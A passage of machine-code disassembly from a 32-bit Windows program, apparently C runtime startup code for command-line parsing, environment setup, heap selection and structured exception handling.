  403979:	eb f1                	jmp    0x40396c
  40397b:	80 38 00             	cmpb   $0x0,(%eax)
  40397e:	0f 84 c8 00 00 00    	je     0x403a4c
  403984:	85 ff                	test   %edi,%edi
  403986:	74 08                	je     0x403990
  403988:	89 37                	mov    %esi,(%edi)
  40398a:	83 c7 04             	add    $0x4,%edi
  40398d:	89 7d 0c             	mov    %edi,0xc(%ebp)
  403990:	8b 55 14             	mov    0x14(%ebp),%edx
  403993:	ff 02                	incl   (%edx)
  403995:	c7 45 08 01 00 00 00 	movl   $0x1,0x8(%ebp)
  40399c:	33 db                	xor    %ebx,%ebx
  40399e:	80 38 5c             	cmpb   $0x5c,(%eax)
  4039a1:	75 04                	jne    0x4039a7
  4039a3:	40                   	inc    %eax
  4039a4:	43                   	inc    %ebx
  4039a5:	eb f7                	jmp    0x40399e
  4039a7:	80 38 22             	cmpb   $0x22,(%eax)
  4039aa:	75 2c                	jne    0x4039d8
  4039ac:	f6 c3 01             	test   $0x1,%bl
  4039af:	75 25                	jne    0x4039d6
  4039b1:	33 ff                	xor    %edi,%edi
  4039b3:	39 7d 18             	cmp    %edi,0x18(%ebp)
  4039b6:	74 0d                	je     0x4039c5
  4039b8:	80 78 01 22          	cmpb   $0x22,0x1(%eax)
  4039bc:	8d 50 01             	lea    0x1(%eax),%edx
  4039bf:	75 04                	jne    0x4039c5
  4039c1:	8b c2                	mov    %edx,%eax
  4039c3:	eb 03                	jmp    0x4039c8
  4039c5:	89 7d 08             	mov    %edi,0x8(%ebp)
  4039c8:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4039cb:	33 d2                	xor    %edx,%edx
  4039cd:	39 55 18             	cmp    %edx,0x18(%ebp)
  4039d0:	0f 94 c2             	sete   %dl
  4039d3:	89 55 18             	mov    %edx,0x18(%ebp)
  4039d6:	d1 eb                	shr    $1,%ebx
  4039d8:	8b d3                	mov    %ebx,%edx
  4039da:	4b                   	dec    %ebx
  4039db:	85 d2                	test   %edx,%edx
  4039dd:	74 0e                	je     0x4039ed
  4039df:	43                   	inc    %ebx
  4039e0:	85 f6                	test   %esi,%esi
  4039e2:	74 04                	je     0x4039e8
  4039e4:	c6 06 5c             	movb   $0x5c,(%esi)
  4039e7:	46                   	inc    %esi
  4039e8:	ff 01                	incl   (%ecx)
  4039ea:	4b                   	dec    %ebx
  4039eb:	75 f3                	jne    0x4039e0
  4039ed:	8a 10                	mov    (%eax),%dl
  4039ef:	84 d2                	test   %dl,%dl
  4039f1:	74 4a                	je     0x403a3d
  4039f3:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
  4039f7:	75 0a                	jne    0x403a03
  4039f9:	80 fa 20             	cmp    $0x20,%dl
  4039fc:	74 3f                	je     0x403a3d
  4039fe:	80 fa 09             	cmp    $0x9,%dl
  403a01:	74 3a                	je     0x403a3d
  403a03:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  403a07:	74 2e                	je     0x403a37
  403a09:	85 f6                	test   %esi,%esi
  403a0b:	74 19                	je     0x403a26
  403a0d:	0f b6 da             	movzbl %dl,%ebx
  403a10:	f6 83 a1 c0 40 00 04 	testb  $0x4,0x40c0a1(%ebx)
  403a17:	74 06                	je     0x403a1f
  403a19:	88 16                	mov    %dl,(%esi)
  403a1b:	46                   	inc    %esi
  403a1c:	40                   	inc    %eax
  403a1d:	ff 01                	incl   (%ecx)
  403a1f:	8a 10                	mov    (%eax),%dl
  403a21:	88 16                	mov    %dl,(%esi)
  403a23:	46                   	inc    %esi
  403a24:	eb 0f                	jmp    0x403a35
  403a26:	0f b6 d2             	movzbl %dl,%edx
  403a29:	f6 82 a1 c0 40 00 04 	testb  $0x4,0x40c0a1(%edx)
  403a30:	74 03                	je     0x403a35
  403a32:	40                   	inc    %eax
  403a33:	ff 01                	incl   (%ecx)
  403a35:	ff 01                	incl   (%ecx)
  403a37:	40                   	inc    %eax
  403a38:	e9 58 ff ff ff       	jmp    0x403995
  403a3d:	85 f6                	test   %esi,%esi
  403a3f:	74 04                	je     0x403a45
  403a41:	80 26 00             	andb   $0x0,(%esi)
  403a44:	46                   	inc    %esi
  403a45:	ff 01                	incl   (%ecx)
  403a47:	e9 17 ff ff ff       	jmp    0x403963
  403a4c:	85 ff                	test   %edi,%edi
  403a4e:	74 03                	je     0x403a53
  403a50:	83 27 00             	andl   $0x0,(%edi)
  403a53:	8b 45 14             	mov    0x14(%ebp),%eax
  403a56:	5f                   	pop    %edi
  403a57:	5e                   	pop    %esi
  403a58:	5b                   	pop    %ebx
  403a59:	ff 00                	incl   (%eax)
  403a5b:	5d                   	pop    %ebp
  403a5c:	c3                   	ret
  403a5d:	51                   	push   %ecx
  403a5e:	51                   	push   %ecx
  403a5f:	a1 38 bf 40 00       	mov    0x40bf38,%eax
  403a64:	53                   	push   %ebx
  403a65:	55                   	push   %ebp
  403a66:	8b 2d 90 80 40 00    	mov    0x408090,%ebp
  403a6c:	56                   	push   %esi
  403a6d:	57                   	push   %edi
  403a6e:	33 db                	xor    %ebx,%ebx
  403a70:	33 f6                	xor    %esi,%esi
  403a72:	33 ff                	xor    %edi,%edi
  403a74:	3b c3                	cmp    %ebx,%eax
  403a76:	75 33                	jne    0x403aab
  403a78:	ff d5                	call   *%ebp
  403a7a:	8b f0                	mov    %eax,%esi
  403a7c:	3b f3                	cmp    %ebx,%esi
  403a7e:	74 0c                	je     0x403a8c
  403a80:	c7 05 38 bf 40 00 01 	movl   $0x1,0x40bf38
  403a87:	00 00 00 
  403a8a:	eb 28                	jmp    0x403ab4
  403a8c:	ff 15 8c 80 40 00    	call   *0x40808c
  403a92:	8b f8                	mov    %eax,%edi
  403a94:	3b fb                	cmp    %ebx,%edi
  403a96:	0f 84 ea 00 00 00    	je     0x403b86
  403a9c:	c7 05 38 bf 40 00 02 	movl   $0x2,0x40bf38
  403aa3:	00 00 00 
  403aa6:	e9 8f 00 00 00       	jmp    0x403b3a
  403aab:	83 f8 01             	cmp    $0x1,%eax
  403aae:	0f 85 81 00 00 00    	jne    0x403b35
  403ab4:	3b f3                	cmp    %ebx,%esi
  403ab6:	75 0c                	jne    0x403ac4
  403ab8:	ff d5                	call   *%ebp
  403aba:	8b f0                	mov    %eax,%esi
  403abc:	3b f3                	cmp    %ebx,%esi
  403abe:	0f 84 c2 00 00 00    	je     0x403b86
  403ac4:	66 39 1e             	cmp    %bx,(%esi)
  403ac7:	8b c6                	mov    %esi,%eax
  403ac9:	74 0e                	je     0x403ad9
  403acb:	40                   	inc    %eax
  403acc:	40                   	inc    %eax
  403acd:	66 39 18             	cmp    %bx,(%eax)
  403ad0:	75 f9                	jne    0x403acb
  403ad2:	40                   	inc    %eax
  403ad3:	40                   	inc    %eax
  403ad4:	66 39 18             	cmp    %bx,(%eax)
  403ad7:	75 f2                	jne    0x403acb
  403ad9:	2b c6                	sub    %esi,%eax
  403adb:	8b 3d 88 80 40 00    	mov    0x408088,%edi
  403ae1:	d1 f8                	sar    $1,%eax
  403ae3:	53                   	push   %ebx
  403ae4:	53                   	push   %ebx
  403ae5:	40                   	inc    %eax
  403ae6:	53                   	push   %ebx
  403ae7:	53                   	push   %ebx
  403ae8:	50                   	push   %eax
  403ae9:	56                   	push   %esi
  403aea:	53                   	push   %ebx
  403aeb:	53                   	push   %ebx
  403aec:	89 44 24 34          	mov    %eax,0x34(%esp)
  403af0:	ff d7                	call   *%edi
  403af2:	8b e8                	mov    %eax,%ebp
  403af4:	3b eb                	cmp    %ebx,%ebp
  403af6:	74 32                	je     0x403b2a
  403af8:	55                   	push   %ebp
  403af9:	e8 c2 05 00 00       	call   0x4040c0
  403afe:	3b c3                	cmp    %ebx,%eax
  403b00:	59                   	pop    %ecx
  403b01:	89 44 24 10          	mov    %eax,0x10(%esp)
  403b05:	74 23                	je     0x403b2a
  403b07:	53                   	push   %ebx
  403b08:	53                   	push   %ebx
  403b09:	55                   	push   %ebp
  403b0a:	50                   	push   %eax
  403b0b:	ff 74 24 24          	push   0x24(%esp)
  403b0f:	56                   	push   %esi
  403b10:	53                   	push   %ebx
  403b11:	53                   	push   %ebx
  403b12:	ff d7                	call   *%edi
  403b14:	85 c0                	test   %eax,%eax
  403b16:	75 0e                	jne    0x403b26
  403b18:	ff 74 24 10          	push   0x10(%esp)
  403b1c:	e8 2b f7 ff ff       	call   0x40324c
  403b21:	59                   	pop    %ecx
  403b22:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  403b26:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  403b2a:	56                   	push   %esi
  403b2b:	ff 15 84 80 40 00    	call   *0x408084
  403b31:	8b c3                	mov    %ebx,%eax
  403b33:	eb 53                	jmp    0x403b88
  403b35:	83 f8 02             	cmp    $0x2,%eax
  403b38:	75 4c                	jne    0x403b86
  403b3a:	3b fb                	cmp    %ebx,%edi
  403b3c:	75 0c                	jne    0x403b4a
  403b3e:	ff 15 8c 80 40 00    	call   *0x40808c
  403b44:	8b f8                	mov    %eax,%edi
  403b46:	3b fb                	cmp    %ebx,%edi
  403b48:	74 3c                	je     0x403b86
  403b4a:	38 1f                	cmp    %bl,(%edi)
  403b4c:	8b c7                	mov    %edi,%eax
  403b4e:	74 0a                	je     0x403b5a
  403b50:	40                   	inc    %eax
  403b51:	38 18                	cmp    %bl,(%eax)
  403b53:	75 fb                	jne    0x403b50
  403b55:	40                   	inc    %eax
  403b56:	38 18                	cmp    %bl,(%eax)
  403b58:	75 f6                	jne    0x403b50
  403b5a:	2b c7                	sub    %edi,%eax
  403b5c:	40                   	inc    %eax
  403b5d:	8b e8                	mov    %eax,%ebp
  403b5f:	55                   	push   %ebp
  403b60:	e8 5b 05 00 00       	call   0x4040c0
  403b65:	8b f0                	mov    %eax,%esi
  403b67:	59                   	pop    %ecx
  403b68:	3b f3                	cmp    %ebx,%esi
  403b6a:	75 04                	jne    0x403b70
  403b6c:	33 f6                	xor    %esi,%esi
  403b6e:	eb 0b                	jmp    0x403b7b
  403b70:	55                   	push   %ebp
  403b71:	57                   	push   %edi
  403b72:	56                   	push   %esi
  403b73:	e8 b8 23 00 00       	call   0x405f30
  403b78:	83 c4 0c             	add    $0xc,%esp
  403b7b:	57                   	push   %edi
  403b7c:	ff 15 80 80 40 00    	call   *0x408080
  403b82:	8b c6                	mov    %esi,%eax
  403b84:	eb 02                	jmp    0x403b88
  403b86:	33 c0                	xor    %eax,%eax
  403b88:	5f                   	pop    %edi
  403b89:	5e                   	pop    %esi
  403b8a:	5d                   	pop    %ebp
  403b8b:	5b                   	pop    %ebx
  403b8c:	59                   	pop    %ecx
  403b8d:	59                   	pop    %ecx
  403b8e:	c3                   	ret
  403b8f:	56                   	push   %esi
  403b90:	8b 74 24 08          	mov    0x8(%esp),%esi
  403b94:	6a 00                	push   $0x0
  403b96:	83 26 00             	andl   $0x0,(%esi)
  403b99:	ff 15 00 80 40 00    	call   *0x408000
  403b9f:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%eax)
  403ba4:	75 14                	jne    0x403bba
  403ba6:	8b 48 3c             	mov    0x3c(%eax),%ecx
  403ba9:	85 c9                	test   %ecx,%ecx
  403bab:	74 0d                	je     0x403bba
  403bad:	03 c1                	add    %ecx,%eax
  403baf:	8a 48 1a             	mov    0x1a(%eax),%cl
  403bb2:	88 0e                	mov    %cl,(%esi)
  403bb4:	8a 40 1b             	mov    0x1b(%eax),%al
  403bb7:	88 46 01             	mov    %al,0x1(%esi)
  403bba:	5e                   	pop    %esi
  403bbb:	c3                   	ret
  403bbc:	55                   	push   %ebp
  403bbd:	8b ec                	mov    %esp,%ebp
  403bbf:	b8 2c 12 00 00       	mov    $0x122c,%eax
  403bc4:	e8 17 2a 00 00       	call   0x4065e0
  403bc9:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
  403bcf:	53                   	push   %ebx
  403bd0:	50                   	push   %eax
  403bd1:	c7 85 68 ff ff ff 94 	movl   $0x94,-0x98(%ebp)
  403bd8:	00 00 00 
  403bdb:	ff 15 98 80 40 00    	call   *0x408098
  403be1:	85 c0                	test   %eax,%eax
  403be3:	74 1a                	je     0x403bff
  403be5:	83 bd 78 ff ff ff 02 	cmpl   $0x2,-0x88(%ebp)
  403bec:	75 11                	jne    0x403bff
  403bee:	83 bd 6c ff ff ff 05 	cmpl   $0x5,-0x94(%ebp)
  403bf5:	72 08                	jb     0x403bff
  403bf7:	6a 01                	push   $0x1
  403bf9:	58                   	pop    %eax
  403bfa:	e9 02 01 00 00       	jmp    0x403d01
  403bff:	8d 85 d4 ed ff ff    	lea    -0x122c(%ebp),%eax
  403c05:	68 90 10 00 00       	push   $0x1090
  403c0a:	50                   	push   %eax
  403c0b:	68 98 81 40 00       	push   $0x408198
  403c10:	ff 15 94 80 40 00    	call   *0x408094
  403c16:	85 c0                	test   %eax,%eax
  403c18:	0f 84 d0 00 00 00    	je     0x403cee
  403c1e:	33 db                	xor    %ebx,%ebx
  403c20:	8d 8d d4 ed ff ff    	lea    -0x122c(%ebp),%ecx
  403c26:	38 9d d4 ed ff ff    	cmp    %bl,-0x122c(%ebp)
  403c2c:	74 13                	je     0x403c41
  403c2e:	8a 01                	mov    (%ecx),%al
  403c30:	3c 61                	cmp    $0x61,%al
  403c32:	7c 08                	jl     0x403c3c
  403c34:	3c 7a                	cmp    $0x7a,%al
  403c36:	7f 04                	jg     0x403c3c
  403c38:	2c 20                	sub    $0x20,%al
  403c3a:	88 01                	mov    %al,(%ecx)
  403c3c:	41                   	inc    %ecx
  403c3d:	38 19                	cmp    %bl,(%ecx)
  403c3f:	75 ed                	jne    0x403c2e
  403c41:	8d 85 d4 ed ff ff    	lea    -0x122c(%ebp),%eax
  403c47:	6a 16                	push   $0x16
  403c49:	50                   	push   %eax
  403c4a:	68 80 81 40 00       	push   $0x408180
  403c4f:	e8 0c e2 ff ff       	call   0x401e60
  403c54:	83 c4 0c             	add    $0xc,%esp
  403c57:	85 c0                	test   %eax,%eax
  403c59:	75 08                	jne    0x403c63
  403c5b:	8d 85 d4 ed ff ff    	lea    -0x122c(%ebp),%eax
  403c61:	eb 49                	jmp    0x403cac
  403c63:	8d 85 64 fe ff ff    	lea    -0x19c(%ebp),%eax
  403c69:	68 04 01 00 00       	push   $0x104
  403c6e:	50                   	push   %eax
  403c6f:	53                   	push   %ebx
  403c70:	ff 15 04 80 40 00    	call   *0x408004
  403c76:	38 9d 64 fe ff ff    	cmp    %bl,-0x19c(%ebp)
  403c7c:	8d 8d 64 fe ff ff    	lea    -0x19c(%ebp),%ecx
  403c82:	74 13                	je     0x403c97
  403c84:	8a 01                	mov    (%ecx),%al
  403c86:	3c 61                	cmp    $0x61,%al
  403c88:	7c 08                	jl     0x403c92
  403c8a:	3c 7a                	cmp    $0x7a,%al
  403c8c:	7f 04                	jg     0x403c92
  403c8e:	2c 20                	sub    $0x20,%al
  403c90:	88 01                	mov    %al,(%ecx)
  403c92:	41                   	inc    %ecx
  403c93:	38 19                	cmp    %bl,(%ecx)
  403c95:	75 ed                	jne    0x403c84
  403c97:	8d 85 64 fe ff ff    	lea    -0x19c(%ebp),%eax
  403c9d:	50                   	push   %eax
  403c9e:	8d 85 d4 ed ff ff    	lea    -0x122c(%ebp),%eax
  403ca4:	50                   	push   %eax
  403ca5:	e8 b6 28 00 00       	call   0x406560
  403caa:	59                   	pop    %ecx
  403cab:	59                   	pop    %ecx
  403cac:	3b c3                	cmp    %ebx,%eax
  403cae:	74 3e                	je     0x403cee
  403cb0:	6a 2c                	push   $0x2c
  403cb2:	50                   	push   %eax
  403cb3:	e8 e8 27 00 00       	call   0x4064a0
  403cb8:	59                   	pop    %ecx
  403cb9:	3b c3                	cmp    %ebx,%eax
  403cbb:	59                   	pop    %ecx
  403cbc:	74 30                	je     0x403cee
  403cbe:	40                   	inc    %eax
  403cbf:	8b c8                	mov    %eax,%ecx
  403cc1:	38 18                	cmp    %bl,(%eax)
  403cc3:	74 0e                	je     0x403cd3
  403cc5:	80 39 3b             	cmpb   $0x3b,(%ecx)
  403cc8:	75 04                	jne    0x403cce
  403cca:	88 19                	mov    %bl,(%ecx)
  403ccc:	eb 01                	jmp    0x403ccf
  403cce:	41                   	inc    %ecx
  403ccf:	38 19                	cmp    %bl,(%ecx)
  403cd1:	75 f2                	jne    0x403cc5
  403cd3:	6a 0a                	push   $0xa
  403cd5:	53                   	push   %ebx
  403cd6:	50                   	push   %eax
  403cd7:	e8 89 25 00 00       	call   0x406265
  403cdc:	83 c4 0c             	add    $0xc,%esp
  403cdf:	83 f8 02             	cmp    $0x2,%eax
  403ce2:	74 1d                	je     0x403d01
  403ce4:	83 f8 03             	cmp    $0x3,%eax
  403ce7:	74 18                	je     0x403d01
  403ce9:	83 f8 01             	cmp    $0x1,%eax
  403cec:	74 13                	je     0x403d01
  403cee:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403cf1:	50                   	push   %eax
  403cf2:	e8 98 fe ff ff       	call   0x403b8f
  403cf7:	80 7d fc 06          	cmpb   $0x6,-0x4(%ebp)
  403cfb:	59                   	pop    %ecx
  403cfc:	1b c0                	sbb    %eax,%eax
  403cfe:	83 c0 03             	add    $0x3,%eax
  403d01:	5b                   	pop    %ebx
  403d02:	c9                   	leave
  403d03:	c3                   	ret
  403d04:	33 c0                	xor    %eax,%eax
  403d06:	6a 00                	push   $0x0
  403d08:	39 44 24 08          	cmp    %eax,0x8(%esp)
  403d0c:	68 00 10 00 00       	push   $0x1000
  403d11:	0f 94 c0             	sete   %al
  403d14:	50                   	push   %eax
  403d15:	ff 15 a0 80 40 00    	call   *0x4080a0
  403d1b:	85 c0                	test   %eax,%eax
  403d1d:	a3 c4 c1 40 00       	mov    %eax,0x40c1c4
  403d22:	74 36                	je     0x403d5a
  403d24:	e8 93 fe ff ff       	call   0x403bbc
  403d29:	83 f8 03             	cmp    $0x3,%eax
  403d2c:	a3 c8 c1 40 00       	mov    %eax,0x40c1c8
  403d31:	75 0d                	jne    0x403d40
  403d33:	68 f8 03 00 00       	push   $0x3f8
  403d38:	e8 b3 0b 00 00       	call   0x4048f0
  403d3d:	59                   	pop    %ecx
  403d3e:	eb 0a                	jmp    0x403d4a
  403d40:	83 f8 02             	cmp    $0x2,%eax
  403d43:	75 18                	jne    0x403d5d
  403d45:	e8 f7 13 00 00       	call   0x405141
  403d4a:	85 c0                	test   %eax,%eax
  403d4c:	75 0f                	jne    0x403d5d
  403d4e:	ff 35 c4 c1 40 00    	push   0x40c1c4
  403d54:	ff 15 9c 80 40 00    	call   *0x40809c
  403d5a:	33 c0                	xor    %eax,%eax
  403d5c:	c3                   	ret
  403d5d:	6a 01                	push   $0x1
  403d5f:	58                   	pop    %eax
  403d60:	c3                   	ret
  403d61:	cc                   	int3
  403d62:	cc                   	int3
  403d63:	cc                   	int3
  403d64:	55                   	push   %ebp
  403d65:	8b ec                	mov    %esp,%ebp
  403d67:	53                   	push   %ebx
  403d68:	56                   	push   %esi
  403d69:	57                   	push   %edi
  403d6a:	55                   	push   %ebp
  403d6b:	6a 00                	push   $0x0
  403d6d:	6a 00                	push   $0x0
  403d6f:	68 7c 3d 40 00       	push   $0x403d7c
  403d74:	ff 75 08             	push   0x8(%ebp)
  403d77:	e8 74 36 00 00       	call   0x4073f0
  403d7c:	5d                   	pop    %ebp
  403d7d:	5f                   	pop    %edi
  403d7e:	5e                   	pop    %esi
  403d7f:	5b                   	pop    %ebx
  403d80:	8b e5                	mov    %ebp,%esp
  403d82:	5d                   	pop    %ebp
  403d83:	c3                   	ret
  403d84:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403d88:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  403d8f:	b8 01 00 00 00       	mov    $0x1,%eax
  403d94:	74 0f                	je     0x403da5
  403d96:	8b 44 24 08          	mov    0x8(%esp),%eax
  403d9a:	8b 54 24 10          	mov    0x10(%esp),%edx
  403d9e:	89 02                	mov    %eax,(%edx)
  403da0:	b8 03 00 00 00       	mov    $0x3,%eax
  403da5:	c3                   	ret
  403da6:	53                   	push   %ebx
  403da7:	56                   	push   %esi
  403da8:	57                   	push   %edi
  403da9:	8b 44 24 10          	mov    0x10(%esp),%eax
  403dad:	50                   	push   %eax
  403dae:	6a fe                	push   $0xfffffffe
  403db0:	68 84 3d 40 00       	push   $0x403d84
  403db5:	64 ff 35 00 00 00 00 	push   %fs:0x0
  403dbc:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403dc3:	8b 44 24 20          	mov    0x20(%esp),%eax
  403dc7:	8b 58 08             	mov    0x8(%eax),%ebx
  403dca:	8b 70 0c             	mov    0xc(%eax),%esi
  403dcd:	83 fe ff             	cmp    $0xffffffff,%esi
  403dd0:	74 2e                	je     0x403e00
  403dd2:	3b 74 24 24          	cmp    0x24(%esp),%esi
  403dd6:	74 28                	je     0x403e00
  403dd8:	8d 34 76             	lea    (%esi,%esi,2),%esi
  403ddb:	8b 0c b3             	mov    (%ebx,%esi,4),%ecx
  403dde:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  403de2:	89 48 0c             	mov    %ecx,0xc(%eax)
  403de5:	83 7c b3 04 00       	cmpl   $0x0,0x4(%ebx,%esi,4)
  403dea:	75 12                	jne    0x403dfe
  403dec:	68 01 01 00 00       	push   $0x101
  403df1:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
  403df5:	e8 40 00 00 00       	call   0x403e3a
  403dfa:	ff 54 b3 08          	call   *0x8(%ebx,%esi,4)
  403dfe:	eb c3                	jmp    0x403dc3
  403e00:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  403e07:	83 c4 0c             	add    $0xc,%esp
  403e0a:	5f                   	pop    %edi
  403e0b:	5e                   	pop    %esi
  403e0c:	5b                   	pop    %ebx
  403e0d:	c3                   	ret
  403e0e:	33 c0                	xor    %eax,%eax
  403e10:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  403e17:	81 79 04 84 3d 40 00 	cmpl   $0x403d84,0x4(%ecx)
  403e1e:	75 10                	jne    0x403e30
  403e20:	8b 51 0c             	mov    0xc(%ecx),%edx
  403e23:	8b 52 0c             	mov    0xc(%edx),%edx
  403e26:	39 51 08             	cmp    %edx,0x8(%ecx)
  403e29:	75 05                	jne    0x403e30
  403e2b:	b8 01 00 00 00       	mov    $0x1,%eax
  403e30:	c3                   	ret
  403e31:	53                   	push   %ebx
  403e32:	51                   	push   %ecx
  403e33:	bb 94 95 40 00       	mov    $0x409594,%ebx
  403e38:	eb 0a                	jmp    0x403e44
  403e3a:	53                   	push   %ebx
  403e3b:	51                   	push   %ecx
  403e3c:	bb 94 95 40 00       	mov    $0x409594,%ebx
  403e41:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403e44:	89 4b 08             	mov    %ecx,0x8(%ebx)
  403e47:	89 43 04             	mov    %eax,0x4(%ebx)
  403e4a:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  403e4d:	59                   	pop    %ecx
  403e4e:	5b                   	pop    %ebx
  403e4f:	c2 04 00             	ret    $0x4
  403e52:	cc                   	int3
  403e53:	cc                   	int3
  403e54:	56                   	push   %esi
  403e55:	43                   	inc    %ebx
  403e56:	32 30                	xor    (%eax),%dh
  403e58:	58                   	pop    %eax
  403e59:	43                   	inc    %ebx
  403e5a:	30 30                	xor    %dh,(%eax)
  403e5c:	55                   	push   %ebp
  403e5d:	8b ec                	mov    %esp,%ebp
  403e5f:	83 ec 08             	sub    $0x8,%esp
  403e62:	53                   	push   %ebx
  403e63:	56                   	push   %esi
  403e64:	57                   	push   %edi
  403e65:	55                   	push   %ebp
  403e66:	fc                   	cld
  403e67:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403e6a:	8b 45 08             	mov    0x8(%ebp),%eax
  403e6d:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  403e74:	0f 85 82 00 00 00    	jne    0x403efc
  403e7a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403e7d:	8b 45 10             	mov    0x10(%ebp),%eax
  403e80:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403e83:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403e86:	89 43 fc             	mov    %eax,-0x4(%ebx)
  403e89:	8b 73 0c             	mov    0xc(%ebx),%esi
  403e8c:	8b 7b 08             	mov    0x8(%ebx),%edi
  403e8f:	83 fe ff             	cmp    $0xffffffff,%esi
  403e92:	74 61                	je     0x403ef5
  403e94:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  403e97:	83 7c 8f 04 00       	cmpl   $0x0,0x4(%edi,%ecx,4)
  403e9c:	74 45                	je     0x403ee3
  403e9e:	56                   	push   %esi
  403e9f:	55                   	push   %ebp
  403ea0:	8d 6b 10             	lea    0x10(%ebx),%ebp
  403ea3:	ff 54 8f 04          	call   *0x4(%edi,%ecx,4)
  403ea7:	5d                   	pop    %ebp
  403ea8:	5e                   	pop    %esi
  403ea9:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403eac:	0b c0                	or     %eax,%eax
  403eae:	74 33                	je     0x403ee3
  403eb0:	78 3c                	js     0x403eee
  403eb2:	8b 7b 08             	mov    0x8(%ebx),%edi
  403eb5:	53                   	push   %ebx
  403eb6:	e8 a9 fe ff ff       	call   0x403d64
  403ebb:	83 c4 04             	add    $0x4,%esp
  403ebe:	8d 6b 10             	lea    0x10(%ebx),%ebp
  403ec1:	56                   	push   %esi
  403ec2:	53                   	push   %ebx
  403ec3:	e8 de fe ff ff       	call   0x403da6
  403ec8:	83 c4 08             	add    $0x8,%esp
  403ecb:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  403ece:	6a 01                	push   $0x1
  403ed0:	8b 44 8f 08          	mov    0x8(%edi,%ecx,4),%eax
  403ed4:	e8 61 ff ff ff       	call   0x403e3a
  403ed9:	8b 04 8f             	mov    (%edi,%ecx,4),%eax
  403edc:	89 43 0c             	mov    %eax,0xc(%ebx)
  403edf:	ff 54 8f 08          	call   *0x8(%edi,%ecx,4)
  403ee3:	8b 7b 08             	mov    0x8(%ebx),%edi
  403ee6:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  403ee9:	8b 34 8f             	mov    (%edi,%ecx,4),%esi
  403eec:	eb a1                	jmp    0x403e8f
  403eee:	b8 00 00 00 00       	mov    $0x0,%eax
  403ef3:	eb 1c                	jmp    0x403f11
  403ef5:	b8 01 00 00 00       	mov    $0x1,%eax
  403efa:	eb 15                	jmp    0x403f11
  403efc:	55                   	push   %ebp
  403efd:	8d 6b 10             	lea    0x10(%ebx),%ebp
  403f00:	6a ff                	push   $0xffffffff
  403f02:	53                   	push   %ebx
  403f03:	e8 9e fe ff ff       	call   0x403da6
  403f08:	83 c4 08             	add    $0x8,%esp
  403f0b:	5d                   	pop    %ebp
  403f0c:	b8 01 00 00 00       	mov    $0x1,%eax
  403f11:	5d                   	pop    %ebp
  403f12:	5f                   	pop    %edi
  403f13:	5e                   	pop    %esi
  403f14:	5b                   	pop    %ebx
  403f15:	8b e5                	mov    %ebp,%esp
  403f17:	5d                   	pop    %ebp
  403f18:	c3                   	ret
  403f19:	55                   	push   %ebp
  403f1a:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403f1e:	8b 29                	mov    (%ecx),%ebp
  403f20:	8b 41 1c             	mov    0x1c(%ecx),%eax
  403f23:	50                   	push   %eax
  403f24:	8b 41 18             	mov    0x18(%ecx),%eax
  403f27:	50                   	push   %eax
  403f28:	e8 79 fe ff ff       	call   0x403da6
  403f2d:	83 c4 08             	add    $0x8,%esp
  403f30:	5d                   	pop    %ebp
  403f31:	c2 04 00             	ret    $0x4
  403f34:	a1 d4 bd 40 00       	mov    0x40bdd4,%eax
  403f39:	83 f8 01             	cmp    $0x1,%eax
  403f3c:	74 0d                	je     0x403f4b
  403f3e:	85 c0                	test   %eax,%eax
  403f40:	75 2a                	jne    0x403f6c
  403f42:	83 3d 74 92 40 00 01 	cmpl   $0x1,0x409274
  403f49:	75 21                	jne    0x403f6c
  403f4b:	68 fc 00 00 00       	push   $0xfc
  403f50:	e8 18 00 00 00       	call   0x403f6d
  403f55:	a1 3c bf 40 00       	mov    0x40bf3c,%eax
  403f5a:	59                   	pop    %ecx
  403f5b:	85 c0                	test   %eax,%eax
  403f5d:	74 02                	je     0x403f61
  403f5f:	ff d0                	call   *%eax
  403f61:	68 ff 00 00 00       	push   $0xff
  403f66:	e8 02 00 00 00       	call   0x403f6d
  403f6b:	59                   	pop    %ecx
  403f6c:	c3                   	ret
  403f6d:	55                   	push   %ebp
  403f6e:	8b ec                	mov    %esp,%ebp
  403f70:	81 ec a4 01 00 00    	sub    $0x1a4,%esp
  403f76:	8b 55 08             	mov    0x8(%ebp),%edx
  403f79:	33 c9                	xor    %ecx,%ecx
  403f7b:	b8 a8 95 40 00       	mov    $0x4095a8,%eax
  403f80:	3b 10                	cmp    (%eax),%edx
  403f82:	74 0b                	je     0x403f8f
  403f84:	83 c0 08             	add    $0x8,%eax
  403f87:	41                   	inc    %ecx
  403f88:	3d 38 96 40 00       	cmp    $0x409638,%eax
  403f8d:	72 f1                	jb     0x403f80
  403f8f:	56                   	push   %esi
  403f90:	8b f1                	mov    %ecx,%esi
  403f92:	c1 e6 03             	shl    $0x3,%esi
  403f95:	3b 96 a8 95 40 00    	cmp    0x4095a8(%esi),%edx
  403f9b:	0f 85 1c 01 00 00    	jne    0x4040bd
  403fa1:	a1 d4 bd 40 00       	mov    0x40bdd4,%eax
  403fa6:	83 f8 01             	cmp    $0x1,%eax
  403fa9:	0f 84 e8 00 00 00    	je     0x404097
  403faf:	85 c0                	test   %eax,%eax
  403fb1:	75 0d                	jne    0x403fc0
  403fb3:	83 3d 74 92 40 00 01 	cmpl   $0x1,0x409274
